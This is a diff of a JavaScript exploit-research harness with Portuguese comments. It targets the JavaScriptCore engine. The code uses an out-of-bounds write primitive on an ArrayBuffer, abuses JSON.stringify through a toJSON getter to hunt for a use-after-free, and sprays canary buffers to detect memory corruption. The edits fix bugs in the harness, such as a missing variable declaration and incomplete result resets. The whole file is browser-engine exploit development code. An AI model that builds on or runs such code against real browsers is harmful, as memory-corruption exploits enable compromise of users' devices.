@@ -29,12 +29,12 @@ const OOB_AB_FILL_PATTERN_U32 = 0xCDCDCDCD;
 const OOB_AB_SNOOP_AREA_START = 0;
 const OOB_AB_SNOOP_AREA_END = 0x800; 
 
-// Metadados sombra (usados para preencher, mas não central para este teste específico de UAF)
+// Metadados sombra (não central para este teste, mas mantido para consistência se referenciado)
 const SHADOW_SIZE_LARGE = new AdvancedInt64(0x7FFFFFF0, 0x0); 
 const SHADOW_DATA_POINTER_CRASH = new AdvancedInt64(0x1, 0x0);
 
 
-class CheckpointForStringifierUAF { // Nome da Classe
+class CheckpointForStringifierUAF {
     constructor(id) {
         this.id_marker = `StringifierUAFCheckpoint-${id}`;
     }
@@ -44,12 +44,14 @@ class CheckpointForStringifierUAF { // Nome da Classe
         const FNAME_GETTER = "StringifierUAF_Getter";
         logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
         
-        current_test_results = { // Resetar
+        current_test_results = { 
             success: false, message: "Getter chamado, testando UAF especulativo do Stringifier.",
             error: null, details: "", corrupted_canaries: [], unexpected_writes_in_oob_ab: []
         };
         let details_log = [];
         let anomalias_detectadas_no_getter = false;
+        let internal_stringify_threw_error = false; // <--- CORRIGIDO: Declarar a variável aqui
+        let internal_stringify_error_msg = "";   // <--- Declarar para armazenar a mensagem de erro
 
         try {
             if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
@@ -93,21 +95,25 @@ class CheckpointForStringifierUAF { // Nome da Classe
             details_log.push(`Spray de ${canary_abs_list.length} canários (ABs de ${canary_ab_size} bytes) concluído.`);
 
             logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
-            let internal_stringify_error_msg = "";
+            // internal_stringify_error_msg já foi declarada
             try {
-                JSON.stringify(obj_to_stress_stringifier);
-                details_log.push(`Stringify interno completado.`);
+                let internal_stringify_output = JSON.stringify(obj_to_stress_stringifier); // CORRIGIDO: Atribui a uma var local
+                details_log.push(`Stringify interno completado. Output length: ${internal_stringify_output.length}.`);
+                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_stringify_output.length}`, "info", FNAME_GETTER);
             } catch (e_json_internal) {
-                internal_stringify_error_msg = e_json_internal.message;
+                internal_stringify_threw_error = true; // Marca que um erro ocorreu
+                internal_stringify_error_msg = e_json_internal.message; // Armazena a msg
                 details_log.push(`Erro no JSON.stringify interno: ${e_json_internal.message}`);
+                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
                 if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
                     anomalias_detectadas_no_getter = true;
+                    current_test_results.error = `Erro incomum no stringify interno: ${e_json_internal.message}`;
                 }
             }
 
             logS3("DENTRO DO GETTER: Verificando ArrayBuffers canário por corrupção após stringify interno...", "info", FNAME_GETTER);
             let num_corrupted_canaries = 0;
-            for (let i = 0; i < canary_abs_list.length; i++) { /* ... (lógica de verificação dos canários como antes) ... */
+            for (let i = 0; i < canary_abs_list.length; i++) {
                 const ab_c = canary_abs_list[i];
                 if (!ab_c || !(ab_c instanceof ArrayBuffer) || ab_c.byteLength !== canary_ab_size) {
                     details_log.push(`Canário[${i}] inválido! Tipo: ${Object.prototype.toString.call(ab_c)}, Length: ${ab_c?.byteLength}`);
@@ -131,10 +137,9 @@ class CheckpointForStringifierUAF { // Nome da Classe
              if (num_corrupted_canaries > 0) logS3(`DENTRO DO GETTER: ${num_corrupted_canaries} CANÁRIOS CORROMPIDOS ENCONTRADOS!`, "vuln", FNAME_GETTER);
              else logS3("DENTRO DO GETTER: Nenhum canário parece corrompido.", "good", FNAME_GETTER);
 
-
             logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações no padrão...", "info", FNAME_GETTER);
             let unexpected_writes_list = [];
-             for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) { /* ... (lógica de sondagem como antes) ... */
+             for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) {
                 if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                 if ((offset + 4) > oob_array_buffer_real.byteLength) break;
                 try {
@@ -150,12 +155,13 @@ class CheckpointForStringifierUAF { // Nome da Classe
             if (unexpected_writes_list.length > 0) logS3(`DENTRO DO GETTER: ${unexpected_writes_list.length} ESCRITAS INESPERADAS NO OOB_AB!`, "vuln", FNAME_GETTER);
             else logS3("DENTRO DO GETTER: Nenhuma alteração de padrão no oob_array_buffer_real.", "good", FNAME_GETTER);
 
-
             if (anomalias_detectadas_no_getter) {
                 current_test_results.success = true;
                 current_test_results.message = "Anomalias (erro stringify interno incomum, canários corrompidos ou escritas em oob_ab) detectadas!";
-            } else if (internal_stringify_threw_error && String(internal_stringify_error_msg).toLowerCase().includes("circular")) {
-                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia.";
+            } else if (internal_stringify_threw_error && String(internal_stringify_error_msg).toLowerCase().includes("circular")) { // USA internal_stringify_error_msg
+                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia óbvia.";
+            } else if (internal_stringify_threw_error) { // Outro erro do stringify interno
+                 current_test_results.message = `Stringify interno falhou com: ${internal_stringify_error_msg}. Nenhuma outra anomalia.`;
             } else {
                 current_test_results.message = "Nenhuma anomalia óbvia detectada ao abusar do Stringifier.";
             }
@@ -172,6 +178,7 @@ class CheckpointForStringifierUAF { // Nome da Classe
     toJSON() {
         const FNAME_toJSON = "CheckpointForStringifierUAF.toJSON";
         logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
+        // eslint-disable-next-line no-unused-vars
         const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
         return { id: this.id_marker, processed_by_stringifier_uaf_test: true };
     }
@@ -182,7 +189,10 @@ export async function executeRetypeOOB_AB_Test() {
     logS3(`--- Iniciando Teste de UAF Especulativo no Stringifier ---`, "test", FNAME_TEST_RUNNER);
 
     getter_called_flag = false;
-    current_test_results = { /* Reset inicial */ }; // Reset completo no início do runner
+    current_test_results = { /* Reset inicial completo */ 
+        success: false, message: "Teste não executado.", error: null,
+        details: "", corrupted_canaries: [], unexpected_writes_in_oob_ab: []
+    };
 
     if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell /* etc.*/) { 
         current_test_results.message = "Offsets JSC críticos ausentes.";
@@ -199,12 +209,13 @@ export async function executeRetypeOOB_AB_Test() {
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
         
-        // A escrita OOB gatilho é feita aqui, ANTES de criar o checkpoint_obj
+        // Não plantamos metadados sombra globais para este teste, pois o foco é o Stringifier
+        
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);
 
-        // CORRIGIDO: Instanciar a classe correta
-        const checkpoint_obj = new CheckpointForStringifierUAF(1);
+        // CORRIGIDO: Usar o nome de classe correto na instanciação
+        const checkpoint_obj = new CheckpointForStringifierUAF(1); 
         logS3(`CheckpointForStringifierUAF objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
         
         logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
@@ -214,17 +225,14 @@ export async function executeRetypeOOB_AB_Test() {
             logS3(`Erro em JSON.stringify (externo): ${e_json_outer.message}`, "error", FNAME_TEST_RUNNER);
              if(!getter_called_flag && current_test_results) { 
                 current_test_results.error = String(e_json_outer);
-                current_test_results.message = current_test_results.message || ""; // Ensure message is initialized
-                current_test_results.message += `Erro em JSON.stringify (antes do getter): ${e_json_outer.message}`;
+                current_test_results.message = (current_test_results.message || "") + `Erro em JSON.stringify (antes do getter): ${e_json_outer.message}`;
             }
         }
-
     } catch (mainError_runner) { 
         logS3(`Erro principal no runner: ${mainError_runner.message}`, "critical", FNAME_TEST_RUNNER);
         console.error(mainError_runner);
-        if(current_test_results) { // current_test_results pode não ter sido inicializado se o erro for muito cedo
-            current_test_results.message = current_test_results.message || "";
-            current_test_results.message += `Erro crítico no runner: ${mainError_runner.message}`;
+        if(current_test_results) {
+            current_test_results.message = (current_test_results.message || "") + `Erro crítico no runner: ${mainError_runner.message}`;
             current_test_results.error = String(mainError_runner);
         }
     }
@@ -232,9 +240,7 @@ export async function executeRetypeOOB_AB_Test() {
         logS3("Limpeza finalizada.", "info", "CleanupRunner");
     }
 
-    // Log dos resultados
     if (getter_called_flag) {
-        // current_test_results já foi preenchido pelo getter
         if (current_test_results.success) {
             logS3(`RESULTADO TESTE STRINGIFIER UAF: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
         } else {
@@ -255,7 +261,7 @@ export async function executeRetypeOOB_AB_Test() {
                 logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
             });
         }
-         if (current_test_results.error) { // Pode ser erro do getter ou erro do runner capturado antes do getter
+         if (current_test_results.error) {
             logS3(`  Erro reportado: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
         }
     } else {
@@ -263,7 +269,7 @@ export async function executeRetypeOOB_AB_Test() {
          if (current_test_results && current_test_results.error) {
             logS3(`  Erro (provavelmente no runner ou setup): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
         } else if (current_test_results) {
-             logS3(`  Mensagem (sem erro explícito): ${current_test_results.message}`, "info", FNAME_TEST_RUNNER);
+             logS3(`  Mensagem (sem erro explícito no runner): ${current_test_results.message}`, "info", FNAME_TEST_RUNNER);
         }
     }
 
